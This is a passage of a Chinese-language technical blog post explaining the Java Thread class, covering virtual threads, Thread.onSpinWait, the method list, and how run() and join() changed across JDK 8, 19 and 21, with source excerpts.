since(JDK19.0)\uff0c\u8fd4\u56de\u865a\u62df\u7ebf\u7a0b\u7684\u5de5\u5382\u7c7b\uff0c\u53ef\u4ee5\u7528\u6765\u521b\u5efa\u865a\u62df\u7ebf\u7a0b\uff08\u534f\u7a0b\uff09 Thread startVirtualThread(Runnable) since(JDK19.0)\uff0c\u521b\u5efa\u4e00\u4e2a\u865a\u62df\u7ebf\u7a0b\u5e76\u4e14\u6267\u884cRunnable\u4efb\u52a1 Map getAllStackTraces() \u8fd4\u56de\u6240\u6709\u5b58\u6d3b\u7ebf\u7a0b\u7684\u6808\u8ffd\u8e2a\u60c5\u51b5 void setDefaultUncaughtExceptionHandler(UncaughtExceptionHandler) \u8bbe\u7f6e\u5f53\u7ebf\u7a0b\u7531\u4e8e\u672a\u6355\u83b7\u7684\u5f02\u5e38\u800c\u7a81\u7136\u7ec8\u6b62\u5e76\u4e14\u5c1a\u672a\u4e3a\u8be5\u7ebf\u7a0b\u5b9a\u4e49\u5176\u4ed6\u5904\u7406\u7a0b\u5e8f\u65f6\u8c03\u7528\u7684\u9ed8\u8ba4\u5904\u7406\u7a0b\u5e8f\u3002 UncaughtExceptionHandler getDefaultUncaughtExceptionHandler() \u8fd4\u56de\u5f53\u7ebf\u7a0b\u7531\u4e8e\u672a\u6355\u83b7\u7684\u5f02\u5e38\u800c\u7a81\u7136\u7ec8\u6b62\u65f6\u8c03\u7528\u7684\u9ed8\u8ba4\u5904\u7406\u7a0b\u5e8f\u3002 \u5982\u679c\u8fd4\u56de\u503c\u4e3anull\uff0c\u5219\u6ca1\u6709\u9ed8\u8ba4\u503c\u3002 <ul> <li> <p>Thread.sleep(0)\u548cThread.yield()</p> <p>Thread.sleep(0)\u8868\u793a\u5f53\u524d\u7ebf\u7a0b\u91ca\u653eCPU\u6267\u884c\u6743\uff0c\u5e76\u4e14\u5728\u7b49\u5f850\u79d2\u540e\u653e\u5165\u5c31\u7eea\u961f\u5217\u4e2d\u3002</p> <p>Thread.yield()\u8868\u793a\u5f53\u524d\u7ebf\u7a0b\u91ca\u653eCPU\u6267\u884c\u6743\uff0c\u5e76\u4e14\u76f4\u63a5\u653e\u5165\u5c31\u7eea\u961f\u5217\u4e2d\u3002</p> <p>\u4e8c\u8005\u5728\u6548\u679c\u4e0a\u4e00\u6837\uff0c\u4f46\u662fsleep()\u8fd8\u9700\u8981\u5bf9\u8bbe\u7f6e\u7684\u65f6\u95f4\u53c2\u6570\u8fdb\u884c\u5224\u65ad\uff0c\u9897\u7c92\u5ea6\u66f4\u5927\uff0c\u56e0\u6b64\u6027\u80fd\u4e0a\u4e0d\u5982<code>yield()</code></p> </li> <li> <p>Thread.onSpinWait()</p> <p>\u4eceJDK9.0\u5f00\u59cb\u51fa\u73b0\uff0c\u4ece\u865a\u62df\u673a\u5c42\u9762\u63d0\u4f9b\u7684\u4e00\u79cd\u81ea\u65cb\u9501\u7684\u65b9\u5f0f\u3002\u53ef\u53c2\u8003\u4e0b\u9762\u6587\u7ae0</p> <p>Thread.Sleep \u4e0e Thread.onSpinWait_\u5feb\u4e50\u5d07\u62dc234\u7684\u535a\u5ba2-CSDN\u535a\u5ba2</p> <pre><code>public static void t() {\n    MD5Test test = new MD5Test();\n    new Thread() {\n        @Override\n        public void run() {\n            int i  = 0;\n            System.out.println(Thread.currentThread().getName() + \"\\t\u7b49\u5f85\u6307\u4ee4...\");\n            while (test.flag) {// \u81ea\u65cb\u7ed3\u6784\n// \u5982\u679c\u5728\u81ea\u65cb\u7ed3\u6784\u4e2d\u4f7f\u7528\u4e86\u8fd9\u4e2a\u51fd\u6570\uff0c\u5e95\u5c42\u4f1a\u5bf9\u8be5\u81ea\u9009\u7ed3\u6784\u4f18\u5316\uff0c\u51cf\u5c11\u5faa\u73af\u5e26\u6765\u7684\u8d44\u6e90\u6d88\u8017\n// \u6027\u80fd\u4f18\u4e8eyield()\u548csleep(0)\n                Thread.onSpinWait();\n            }\n            System.out.println(Thread.currentThread().getName() + \"\\t\u63a5\u6536\u5230\u6307\u4ee4\");\n        }\n    }.start();\n    new Thread() {\n        @Override\n        public void run() {\n            try {\n                System.out.println(\"\u7ebf\u7a0b\u4e8c\u7b49\u5f851\u79d2\");\n                sleep(1000);\n                test.setFlag(false);\n                System.out.println(\"\u7ebf\u7a0b\u4e8c\u53d1\u51fa\u6307\u4ee4\");\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        }\n    }.start();\n}\n</code></pre> </li> <li> <p>\u5e73\u53f0\u7ebf\u7a0b\u548c\u865a\u62df\u7ebf\u7a0b\uff08\u534f\u7a0b\uff09</p> <p>\u4eceJava19\u5f15\u5165\u865a\u62df\u7ebf\u7a0b\u5f00\u59cb\uff0c\u4f20\u7edf\u7684Thread\u88ab\u79f0\u4e3a\u5e73\u53f0\u7ebf\u7a0b\uff0c\u4e0e\u865a\u62df\u7ebf\u7a0b\u5bf9\u5e94\u3002\u540e\u6587\u5982\u679c\u4e0d\u7279\u522b\u5f3a\u8c03\uff0cJava\u7ebf\u7a0b\u4e00\u822c\u90fd\u662f\u6307Java\u7684\u5e73\u53f0\u7ebf\u7a0b\u3002</p> <p>\u8fd9\u91cc\u5176\u5b9e\u5e94\u8be5\u548cgolang\u4e2d\u7684\u534f\u7a0b\u533a\u5206\u5f00\u6765\u7684\uff0cjdk19\u4e2d\u7684\u865a\u62df\u7ebf\u7a0b\u5e76\u4e0d\u5b8c\u5168\u7b49\u540c\u4e8egolang\u7684\u534f\u7a0b\uff0c\u6bcf\u4e2a\u8bed\u8a00\u7684\u534f\u7a0b\u90fd\u6709\u81ea\u5df1\u7684\u5b9e\u73b0\u65b9\u5f0f\uff0c\u8fd9\u5e76\u4e0d\u6709\u7cfb\u7edf\u672c\u8eab\u51b3\u5b9a\uff08\u5f53\u7136\uff0cgolang\u4f7f\u7528\u7684\u662f\u4ece\u7cfb\u7edf\u5c42\u9762\u7684\u534f\u7a0b\uff09\uff0c\u5177\u4f53\u53ef\u53c2\u8003Java19 \u865a\u62df\u7ebf\u7a0b VS Go \u534f\u7a0b \u7684\u541e\u5410\u91cf-CSDN\u535a\u5ba2</p> <p>\u5e73\u53f0\u7ebf\u7a0b\u662f\u7cfb\u7edf\u7ea7\u522b\u7684\u8d44\u6e90\uff0c\u6bcf\u6b21\u521b\u5efa\u65f6\u90fd\u8981\u5411\u7cfb\u7edf\u7533\u8bf7\u8d44\u6e90\uff0c\u56e0\u6b64\u6781\u5927\u7a0b\u5ea6\u7684\u53d7\u5230\u7cfb\u7edf\u7684\u5f71\u54cd\uff0c\u800c\u4e14\u5c0f\u53f7\u7684\u8d44\u6e90\u5f80\u5f80\u8ddf\u591a\uff0c\u6027\u80fd\u4e0a\u4e0d\u5982\u534f\u7a0b\u3002</p> <p>\u865a\u62df\u7ebf\u7a0b\u662fJDK19\u4e2dJEP 425\u4e2d\u63d0\u51fa\u7684\u6982\u5ff5\uff0c\u57282023\u5e74\u4e5d\u6708\u6b63\u5f0f\u53d1\u5e03GA\u7684\u4e00\u4e2ajava\u4f53\u7cfb\u5185\u7684\u7ebf\u7a0b\uff0c\u4ed6\u662fjava\u5e73\u53f0\u5bf9\u7ebf\u7a0b\u7684\u4e00\u79cd\u66f4\u8f7b\u91cf\u7ea7\u7684\u5b9e\u73b0\u3002</p> <p>\u534f\u7a0b\u770b\u8d77\u6765\u548c\u7ebf\u7a0b\u5dee\u4e0d\u591a\uff0c\u4f46\u521b\u5efa\u4e00\u4e2a\u534f\u7a0b\u5374\u4e0d\u7528\u8c03\u7528\u64cd\u4f5c\u7cfb\u7edf\u7684\u529f\u80fd\uff0c\u7f16\u7a0b\u8bed\u8a00\u81ea\u8eab\u5c31\u80fd\u5b8c\u6210\u8fd9\u9879\u64cd\u4f5c\uff0c\u6240\u4ee5\u534f\u7a0b\u4e5f\u88ab\u79f0\u4f5c\u7528\u6237\u6001\u7ebf\u7a0b\u3002\u6211\u4eec\u77e5\u9053\u65e0\u8bba\u662fjava\u8fd8\u662fgo\u7a0b\u5e8f\uff0c\u90fd\u62e5\u6709\u4e00\u4e2a\u4e3b\u7ebf\u7a0b\uff0c\u8fd9\u4e2a\u7ebf\u7a0b\u4e0d\u7528\u663e\u793a\u7f16\u7801\u521b\u5efa\uff0c\u7a0b\u5e8f\u542f\u52a8\u65f6\u9ed8\u8ba4\u5c31\u4f1a\u521b\u5efa\u3002\u534f\u7a0b\u662f\u53ef\u4ee5\u8dd1\u5728\u8fd9\u79cd\u7ebf\u7a0b\u4e0a\u7684\uff0c\u4f60\u53ef\u4ee5\u521b\u5efa\u591a\u4e2a\u534f\u7a0b\uff0c\u8fd9\u4e9b\u534f\u7a0b\u8dd1\u5728\u4e3b\u7ebf\u7a0b\u4e0a\uff0c\u5b83\u4eec\u548c\u7ebf\u7a0b\u7684\u5173\u7cfb\u662f\u4e00\u5bf9\u591a\u3002\u5982\u679c\u4f60\u8981\u521b\u5efa\u4e00\u4e2a\u7ebf\u7a0b\uff0c\u90a3\u4e48\u4f60\u5fc5\u987b\u8fdb\u884c\u64cd\u4f5c\u7cfb\u7edf\u8c03\u7528\uff0c\u521b\u5efa\u7684\u7ebf\u7a0b\u548c\u4e3b\u7ebf\u7a0b\u662f\u540c\u4e00\u79cd\u4e1c\u897f\u3002\u663e\u7136\uff0c\u534f\u7a0b\u6bd4\u7ebf\u7a0b\u8981\u8f7b\u91cf\u7684\u591a\u3002\u53ef\u53c2\u8003Java19 \u6b63\u5f0f GA\uff01\u770b\u865a\u62df\u7ebf\u7a0b\u5982\u4f55\u5927\u5e45\u63d0\u9ad8\u7cfb\u7edf\u541e\u5410\u91cf - \u5f00\u6e90\u4e2d\u56fd</p> <p>\u65e2\u7136\u534f\u7a0b\u8fd9\u4e48\u4f18\u79c0\uff0c\u4e3a\u4ec0\u4e48\u4e0d\u5f7b\u5e95\u66ff\u4ee3\u7ebf\u7a0b\u5462\uff1f\u4e8b\u5b9e\u4e0a\u534f\u7a0b\u548c\u7ebf\u7a0b\u5b8c\u5168\u4e0d\u662f\u4e24\u4e2a\u76f8\u540c\u5c42\u9762\u7684\u4e1c\u897f\uff0c\u5b8c\u5168\u8c08\u4e0d\u4e0a\u66ff\u4ee3\u4e00\u8bf4\uff0c\u534f\u7a0b\u53ef\u4ee5\u8bf4\u662f\u4e00\u4e2a\u72ec\u7acb\u4e8e\u7ebf\u7a0b\u7684\u529f\u80fd\uff0c\u5b83\u662f\u5728\u7ebf\u7a0b\u7684\u57fa\u7840\u4e0a\uff0c\u9488\u5bf9\u67d0\u4e9b\u5e94\u7528\u573a\u666f\u8fdb\u4e00\u6b65\u53d1\u5c55\u51fa\u6765\u7684\u529f\u80fd\u3002\u6211\u4eec\u77e5\u9053\uff0c\u7ebf\u7a0b\u5728\u591a\u6838\u7684\u73af\u5883\u4e0b\u662f\u80fd\u505a\u5230\u771f\u6b63\u610f\u4e49\u4e0a\u7684\u5e76\u884c\u6267\u884c\u7684\uff0c\u6ce8\u610f\uff0c\u662f\u5e76\u884c\uff0c\u4e0d\u662f\u5e76\u53d1\uff0c\u800c\u534f\u7a0b\u662f\u4e3a\u5e76\u53d1\u800c\u751f\u7684\u3002</p> </li> <li> <p>\u6210\u5458\u65b9\u6cd5</p> </li> </ul> \u65b9\u6cd5 \u8bf4\u660e final boolean isVirtual() \u5224\u65ad\u662f\u5426\u4e3a\u865a\u62df\u7ebf\u7a0b void start() \u542f\u52a8\u7ebf\u7a0b\uff0c\u4e00\u4e2a\u7ebf\u7a0b\u53ea\u80fd\u542f\u52a8\u4e00\u6b21 void run() \u6b64\u65b9\u6cd5\u5728\u6267\u884c\u65f6\u7531\u7ebf\u7a0b\u8fd0\u884c\u3002Thread\u7684\u5b50\u7c7b\u53ef\u4ee5\u8986\u76d6\u6b64\u65b9\u6cd5\u3002\u6b64\u65b9\u6cd5\u4e0d\u5efa\u8bae\u76f4\u63a5\u8c03\u7528\u3002\u5982\u679c\u6b64\u7ebf\u7a0b\u662f\u4f7f\u7528Runnable\u4efb\u52a1\u521b\u5efa\u7684\u5e73\u53f0\u7ebf\u7a0b\uff0c\u90a3\u4e48\u8c03\u7528\u6b64\u65b9\u6cd5\u5c06\u8c03\u7528\u4efb\u52a1\u7684run\u65b9\u6cd5\u3002\u5982\u679c\u8fd9\u4e2a\u7ebf\u7a0b\u662f\u4e00\u4e2a\u865a\u62df\u7ebf\u7a0b\uff0c\u90a3\u4e48\u76f4\u63a5\u8c03\u7528\u8fd9\u4e2a\u65b9\u6cd5\u4ec0\u4e48\u4e5f\u4e0d\u505a\u3002 void interrupt() \u4e2d\u65ad\u7ebf\u7a0b\uff0c\u7ebf\u7a0b\u53ef\u4ee5\u81ea\u5df1\u4e2d\u65ad\u81ea\u5df1\uff0c\u4f46\u662f\u4e2d\u65ad\u5176\u4ed6\u7ebf\u7a0b\u65f6\u5f90\u4e9a\u68c0\u67e5\u6743\u9650 boolean isInterrupted() \u68c0\u67e5\u7ebf\u7a0b\u662f\u5426\u4e2d\u65ad final boolean isAlive() \u68c0\u67e5\u7ebf\u7a0b\u662f\u5426\u5b58\u6d3b\uff08\u5df2\u7ecf\u5f00\u59cb\u6216\u8005\u672a\u7ec8\u6b62\uff09 final void setPriority(int) \u8bbe\u7f6e\u7ebf\u7a0b\u7684\u4f18\u5148\u7ea7\uff081-10\uff09,\u865a\u62df\u7ebf\u7a0b\u76f4\u63a5\u5ffd\u7565\u8fd9\u4e2a\u51fd\u6570 final int getPriority() \u83b7\u53d6\u7ebf\u7a0b\u7684\u4f18\u5148\u7ea7\uff0c\u865a\u62df\u7ebf\u7a0b\u6ca1\u6709\u4f18\u5148\u7ea7\uff0c\u5bf9\u865a\u62df\u7ebf\u7a0b\u59cb\u7ec8\u8fd4\u56de5\uff08NORM_PRIORITY\uff09 final synchronized void setName(String) \u8bbe\u7f6e\u7ebf\u7a0b\u540d\u79f0\uff0c\u975e\u865a\u62df\u7ebf\u7a0b\u5bf9\u81ea\u5df1\u8bbe\u7f6e\u65f6\u8fd8\u4f1a\u8c03\u7528\u5e95\u5c42 final String getName() \u83b7\u53d6\u7ebf\u7a0b\u540d\u79f0 final ThreadGruop getThreadGruop() \u83b7\u53d6\u7ebf\u7a0b\u7684\u7ebf\u7a0b\u7ec4\uff08\u7ebf\u7a0b\u7ec4\u662f\u5f02\u5e38\u5904\u7406\u5668\u63a5\u53e3\u7684\u5b9e\u73b0\uff09 final void join(long) \u6700\u591a\u7b49\u5f85 millis \u6beb\u79d2\u4ee5\u4f7f\u8be5\u7ebf\u7a0b\u7ec8\u6b62\u3002\u8d85\u65f6\u4e3a 0 \u610f\u5473\u7740\u6c38\u8fdc\u7b49\u5f85\u3002\u5982\u679c\u7ebf\u7a0b\u5c1a\u672a\u542f\u52a8\uff0c\u5219\u6b64\u65b9\u6cd5\u7acb\u5373\u8fd4\u56de\uff0c\u65e0\u9700\u7b49\u5f85\u3002(\u6267\u884c\u5b8c\u8c03\u7528\u8005\u7684\u7ebf\u7a0b\u4e4b\u540e\u624d\u80fd\u7ee7\u7eed) final void join(long , int ) \u6700\u591a\u7b49\u5f85millis\u6beb\u79d2\u548cnanos\u7eb3\u79d2\u7b49\u5f85\u8be5\u7ebf\u7a0b\u7ec8\u6b62\u3002\u8d85\u65f6\u4e3a0\u610f\u5473\u7740\u6c38\u8fdc\u7b49\u5f85\uff0c\u540c\u4e0a final void join() \u6c38\u8fdc\u7b49\u5f85\uff0c\u672c\u8d28\u4e0a\u4e3a<code>join(0)</code> final boolean join(Duration) since(JDK19)\uff0c\u7b49\u5f85\u6b64\u7ebf\u7a0b\u7ec8\u6b62\uff0c\u76f4\u81f3\u8fbe\u5230\u7ed9\u5b9a\u7684\u7b49\u5f85\u6301\u7eed\u65f6\u95f4\u3002\u8fd4\u56de\u8be5\u7ebf\u7a0b\u662f\u5426\u5728\u51fd\u6570\u6267\u884c\u671f\u95f4\u7ec8\u6b62\u3002 final void setDaemon(boolean) \u5bf9\u662f\u5426\u4e3a\u5b88\u62a4\u7ebf\u7a0b\u8fdb\u884c\u8bbe\u7f6e\u3002\u7ebf\u7a0b\u542f\u52a8\u540e\u4e0d\u53ef\u6539\u53d8 final boolean isDaemon() \u5224\u65ad\u7ebf\u7a0b\u662f\u5426\u4e3a\u5b88\u62a4\u7ebf\u7a0b\u3002\u865a\u62df\u7ebf\u7a0b\u59cb\u7ec8\u4e3a\u5b88\u62a4\u7ebf\u7a0b final void checkAccess() \u68c0\u67e5\u5f53\u524d\u7ebf\u7a0b\u662f\u5426\u6709\u6743\u9650\u4fee\u6539\u8be5\u7ebf\u7a0b\uff0c\u4eceJDK17\u5f00\u59cb\u5f03\u7528\uff0c\u4f46\u662f\u76ee\u524dJDK21\u5185\u90e8\u4ecd\u7136\u4f7f\u7528\u4ed6\u3002 ClassLoader getContextClassLoader() \u83b7\u53d6\u5f53\u524d\u7ebf\u7a0b\u5185\u7684\u7c7b\u52a0\u8f7d\u5668\uff0c\u5982\u679c\u6ca1\u6709\u8bbe\u7f6e\uff0c\u9ed8\u8ba4\u8fd4\u56de\u7236\u7ebf\u7a0b\u7684\u7c7b\u52a0\u8f7d\u5668\u3002 void setContextClassLoader(ClassLoader) \u8bbe\u7f6e\u7ebf\u7a0b\u4e2d\u7684\u7c7b\u52a0\u8f7d\u5668\uff0c\u4e5f\u5c31\u662f\u8bf4\u6bcf\u4e2a\u7ebf\u7a0b\u53ef\u4ee5\u6709\u4e00\u4e2a\u5355\u72ec\u7684\u7c7b\u52a0\u8f7d\u5668 StackTraceElement[] getStackTrace() \u8fd4\u56de\u7ebf\u7a0b\u7684\u6808\u7684\u60c5\u51b5\uff0c\u5982\u679c\u65f6\u5f53\u524d\u7684\u7ebf\u7a0b\uff0c\u5219\u76f4\u63a5\u901a\u8fc7\u5f02\u5e38\u7c7b\u7684\u6808\u8ffd\u8e2a final long threadId() \u8fd4\u56de\u8be5\u7ebf\u7a0b\u7684ID\uff0c\u4ee3\u66ff\u4e86JDK19\u4e4b\u524d\u7684getId()\uff0c\u56e0\u4e3agetId()\u4e0d\u662ffinal\uff0c\u4e0d\u5b89\u5168 State getState() \u8fd4\u56de\u7ebf\u7a0b\u72b6\u6001 UncaughtExceptionHandler getUncaughtExceptionHandler() \u8fd4\u56de\u7ebf\u7a0b\u7684\u5f02\u5e38\u5904\u7406\u5668\uff0c\u5982\u679c\u7ebf\u7a0b\u5df2\u7ecf\u7ec8\u6b62\uff0c\u5219\u8fd4\u56deNULL void setUncaughtExceptionHandler(UncaughtExceptionHandler) \u8bbe\u7f6e\u7ebf\u7a0b\u7684\u5f02\u5e38\u5904\u7406\u5668 <ul> <li>Thread\u7ee7\u627f\u4e86Runnable\u63a5\u53e3\uff0c\u800cThread\u7684\u6784\u9020\u5668\u4e2d\u7684\u53c2\u6570\u8981\u6c42\u4f20\u5165\u7684\u5c31\u662f\u4e00\u4e2aRunnable\uff0c\u800c\u5728Thread\u5e95\u5c42\u7684\u6784\u9020\u539f\u7406\u662f\u5c06Runnable\u5bf9\u8c61\u5305\u88c5\u4e3aFieldHolder\u5185\u90e8\u7c7b\uff0c\u5728\u8c03\u7528<code>start()</code>\u65b9\u6cd5\u65f6\uff0c\u5219\u901a\u8fc7\u4ee3\u7406\u6a21\u5f0f \u8c03\u7528Runnable\u7684<code>run()</code>\u51fd\u6570\u3002</li> </ul> <p>\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u505a\u4e00\u4e2a\u5c0f\u5b9e\u9a8c\uff0c\u65e2\u7136Thread\u7684\u4e0a\u5c42\u8fd8\u65f6Runnable\uff0c\u90a3\u4e48\u53ef\u5426\u81ea\u5df1\u8c03\u7528\u81ea\u5df1\u5462\uff1f</p> <ul> <li>\u601d\u8def\u4e00\uff1a\u6211\u4eec\u5728Thread\u6784\u9020\u51fd\u6570\u4e2d\u5c06\u81ea\u5df1\u4f5c\u4e3a\u53c2\u6570\u5305\u88c5\u4e3aFieldHolder\uff0c\u6211\u4eec\u53ef\u4ee5\u7ee7\u627f\u5e76\u4e14\u91cd\u5199\u4ed6\u7684\u6784\u9020\u7c7b\uff0c\u7136\u540e\u8c03\u7528<code>super()</code>\u65f6\u5c06\u81ea\u5df1\u4f20\u7ed9\u7236\u7c7b\u6784\u9020\u5668\uff0c\u4f46\u662f\u7740\u5728\u662f\u884c\u4e0d\u901a\u7684\u3002\u62a5\u9519\u5982\u4e0b</li> </ul> <p>java: \u65e0\u6cd5\u5728\u8c03\u7528\u8d85\u7c7b\u578b\u6784\u9020\u5668\u4e4b\u524d\u5f15\u7528this</p> <ul> <li>\u601d\u8def\u4e8c\uff1a\u6211\u4eec\u5148\u521b\u5efa\u4e00\u4e2a\u5b9e\u73b0Runnable\u63a5\u53e3\u7684\u533f\u540d\u5bf9\u8c61\uff0c\u7136\u540e\u5728<code>run()</code>\u65b9\u6cd5\u4e2d\u521b\u5efa\u4e00\u4e2aThread\u5bf9\u8c61\uff0c\u5c06\u81ea\u5df1\u4f5c\u4e3a\u53c2\u6570\u4f20\u5165\u5e76\u542f\u52a8\u3002\u4ee3\u7801\u5982\u4e0b</li> </ul> <pre><code>new Runnable(){\n    @Override\n    public void run() {\n        System.out.println(++hello);\n        System.out.println(Thread.currentThread().getName());\n        new Thread(this).start();\n    }\n}.run();\n</code></pre> <ul> <li>Thread\u7ebf\u7a0b\u53ea\u80fd\u542f\u52a8\u4e00\u6b21\uff0c\u540c\u4e00\u4e2a\u7ebf\u7a0b\u4e0d\u80fd\u53cd\u590d\u542f\u52a8\uff0c\u53ef\u53c2\u8003JAVA\u7ebf\u7a0b\u521b\u5efa\u5e95\u5c42\u6d41\u7a0b-\u963f\u91cc\u4e91\u5f00\u53d1\u8005\u793e\u533a (aliyun.com)</li> </ul> <pre><code>public void start() {\n    synchronized (this) {\n        // \u7ebf\u7a0b\u5bf9\u8c61\u7684\u72b6\u6001\u5fc5\u987b\u662fNEW\u7684\uff0c\u4e5f\u5c31\u662f\u65b0\u5efa\u7684\uff0c\u5426\u5219\u629b\u51fa\u5f02\u5e38\n        if (holder.threadStatus != 0)\n            throw new IllegalThreadStateException();\n        start0();//start0()\u662f\u4e00\u4e2a\u672c\u5730\u65b9\u6cd5\uff0c\u4e5f\u5c31\u662f\u8c03\u7528\u7cfb\u7edf\u5e95\u5c42\u7684\u5b9e\u73b0\n    }\n}\n</code></pre> <ul> <li> <p>\u6709\u5173<code>run()</code>\u65b9\u6cd5\uff0c\u5728JDK\u7684\u7248\u672c\u4e2d\u7565\u6709\u53d8\u5316\uff0c\u6211\u4eec\u5206\u6790\u4e00\u4e0b\u53d8\u5316\u7684\u539f\u56e0</p> <ul> <li>JDK8</li> </ul> <pre><code>public void run() {\n    if (target != null) {\n        target.run();\n    }\n}\n</code></pre> <p>JDK8\u4e2d\u7684Thread\u7c7b\u5728\u521b\u5efa\u65f6\u5e76\u6ca1\u6709\u5427\u4f20\u5165\u7684Runnable\u63a5\u53e3\u5c01\u88c5\uff0c\u800c\u662f\u76f4\u63a5\u5b58\u50a8\u5728\u4ed6\u7684<code>private Runnable target;</code>\u4e2d</p> <ul> <li>JDK19</li> </ul> <pre><code>public void run() {\n    Runnable task = holder.task;\n    if (task != null) {\n        task.run();\n    }\n}\n</code></pre> <p>JDK19\u5bf9Runnable\u63a5\u53e3\u4f18\u5316\uff0c\u5c06\u5176\u5c01\u88c5\u5728\u5185\u90e8\u7c7b<code>private final FieldHolder holder;</code>\uff0c\u6709\u5173\u8fd9\u4e2a\u5185\u90e8\u7c7b\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u4e00\u770b\u5b98\u65b9\u5bf9\u4ed6\u7684\u63cf\u8ff0</p> <p>Additional fields for platform threads.\uff08\u5e73\u53f0\u7ebf\u7a0b\u7684\u5176\u4ed6\u5b57\u6bb5\uff09 All fields, except task, are accessed directly by the VM.\uff08\u9664\u4e86task\u5916\uff08Runnable\u63a5\u53e3\uff09\uff0c\u5176\u4f59\u53ef\u4ee5\u76f4\u63a5\u88abJVM\u8bbf\u95ee\uff09</p> <p>\u90a3\u4e48\u8fd9\u4e2a\u7c7b\u4e2d\u6709\u54ea\u4e9b\u5b57\u6bb5\u5462\uff1f</p> <pre><code>private static class FieldHolder {\n    final ThreadGroup group;//\u7ebf\u7a0b\u7ec4\n    final Runnable task;//\u4efb\u52a1\u5bf9\u8c61\n    final long stackSize;//\u9884\u8bbe\u7684\u6808\u7a7a\u95f4\u5927\u5c0f\uff0c-1\u8868\u793a\u6ca1\u6709\u9650\u5236\uff0c\u5728\u521b\u5efaThread\u7684\u65f6\u5019\u53ef\u4ee5\u6307\u5b9a\uff0c\u9ed8\u8ba4-1\n    volatile int priority;//\u4f18\u5148\u7ea7\n    volatile boolean daemon;//\u662f\u5426\u4e3a\u5b88\u62a4\u7ebf\u7a0b\n    volatile int threadStatus;//\u7ebf\u7a0b\u72b6\u6001\uff0c0\u8868\u793aNEW\n    boolean stillborn;//JVM\u72b6\u6001\uff0c\u9ed8\u8ba4\u4e3afalse\n}\n</code></pre> <p>\u5bf9\u6bd4JDK8\u53d1\u73b0\uff0c\u9664\u4e86<code>stackSize</code>\u4e4b\u5916\uff0c\u5176\u4f59\u90fd\u662f\u4eceThread\u5916\u90e8\u7c7b\u4e2d\u62bd\u8c61\u8fdb\u6765\u7684\uff0c\u8fd9\u6837\u5c01\u88c5\u6709\u4ec0\u4e48\u597d\u5904\u5462\uff1f\u4ed6\u53ef\u4ee5\u5b9e\u73b0\u4e00\u4e2a\u5ef6\u8fdf\u521d\u59cb\u5316\uff0c\u4e5f\u5c31\u662f\u5728\u771f\u6b63\u9700\u8981\u521d\u59cb\u5316\u7684\u65f6\u5019\u518d\u53bb\u6267\u884c\u521d\u59cb\u5316\u8fc7\u7a0b\uff0c\u540c\u65f6\u4e5f\u53ef\u4ee5\u65b9\u4fbf\u4ee5\u540e\u5f97\u6269\u5c55\uff08\u901a\u8fc7\u7ee7\u627fFieldHolder\uff09</p> <ul> <li>JDK21</li> </ul> <pre><code>public void run() {\n    Runnable task = holder.task;\n    if (task != null) {\n        Object bindings = scopedValueBindings();\n        runWith(bindings, task);\n    }\n}\n</code></pre> <p>JDK21\u76f8\u6bd4\u4e8eJDK19\u6700\u5927\u7684\u533a\u522b\u5c31\u5728\u4e8e\u6267\u884c\u65f6\u7684\u4e0d\u540c\uff0cJDK21\u5728\u6267\u884c\u524d\u8fd8\u7ed1\u5b9a\u4e86\u53c2\u6570\uff0c\u800c\u4e14\u4f7f\u7528\u4ee3\u7406\u7684\u65b9\u5f0f\u8c03\u7528\u3002\u6709\u5565\u597d\u5904\u5462\uff0c\u7ee7\u7eed\u770b\u6e90\u7801\u3002\u6211\u4eec\u5148\u770b<code>scopedValueBindings()</code>\u7684\u4f5c\u7528\uff1a</p> <pre><code>static Object scopedValueBindings() {\n    return currentThread().scopedValueBindings;\n} \n</code></pre> <p>\u6211\u4eec\u4eceopenJDK\u5b98\u7f51\u4e0a\u67e5\u5230Scoped Values\u662fJDK20\u5f15\u5165\u7684\u6027\u7279\u6027\uff0c\u8be6\u60c5\u53ef\u53c2\u8003JEP 429: Scoped Values (Incubator) --- JEP 429\uff0c\u5728Scoped Values\u4e4b\u524d\uff0c\u6211\u4eec\u5f80\u5f80\u901a\u8fc7Thread Local\u6765\u8bfb\u5199\u7ebf\u7a0b\u7684\u53d8\u91cf\uff0c\u800cScoped Value\u6709\u53ef\u80fd\u5728\u672a\u6765\u6210\u4e3a\u4ed6\u7684\u66ff\u4ee3\u3002\u4e0b\u9762\u7684\u662f\u5e73\u53ef\u4ee5\u53c2\u8003</p> <p> </p> <p>Scoped Value\u7684\u4f5c\u7528</p> <ul> <li>\u4f5c\u4e3aThread Local\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\u7684\u66ff\u4ee3</li> <li>\u5171\u4eab\u4e0d\u53ef\u53d8\u7684\u503c</li> <li>\u89e3\u51b3\u865a\u62df\u7ebf\u7a0b\u7684\u4f7f\u7528Thread Local\u7684\u4e00\u4e9b\u95ee\u9898</li> </ul> <p>\u518d\u770b\u770b<code>runWith(Object bindings, Runnable op)</code>\uff0c\u59a5\u59a5\u7684\u4ee3\u7406\u6a21\u5f0f</p> <pre><code>/**\n * The VM recognizes this method as special, so any changes to the\n * name or signature require corresponding changes in\n * JVM_FindScopedValueBindings().\n */\n@Hidden//\u6808\u7a7a\u95f4\u4e0a\u4e0d\u663e\u793a\uff0c\u5728stack traces\u7684\u65f6\u5019\u4f1a\u88ab\u5ffd\u7565\n@ForceInline//\u5f3a\u5236inline \u4e0d\u53ef\u5ffd\u7565\nprivate void runWith(Object bindings, Runnable op) {\n    ensureMaterializedForStackWalk(bindings);//\u5bf9Scoped Value \u68c0\u67e5\uff0c\u6b64\u4e3a\u672c\u5730\u65b9\u6cd5\n    op.run();\n    Reference.reachabilityFence(bindings);//\u53ef\u8fbe\u6027\u5206\u6790\n}\n</code></pre> </li> <li> <p><code>void join(long)</code>\u51fd\u6570\u5728JDK8\u548cJDK19\u4e4b\u540e\u7684\u7248\u672c\u6709\u5927\u7684\u6539\u53d8\uff1a</p> <ul> <li>JDK8\u4f7f\u7528\u540c\u6b65\u65b9\u6cd5\uff0c\u5927\u9897\u7c92\u52a0\u9501\u5bfc\u81f4\u6027\u80fd\u4f4e\u4e0b</li> </ul> <pre><code>public final synchronized void join(long millis) throws InterruptedException {\n    long base = System.currentTimeMillis();\n    long now = 0;\n    if (millis &lt; 0) {\n        throw new IllegalArgumentException(\"timeout value is negative\");\n    }\n    if (millis == 0) {\n        while (isAlive()) {//\u672a\u5904\u7406\u5b8c\u4fbf\u81ea\u65cb\u963b\u585e\n            wait(0);\n        }\n    } else {\n        while 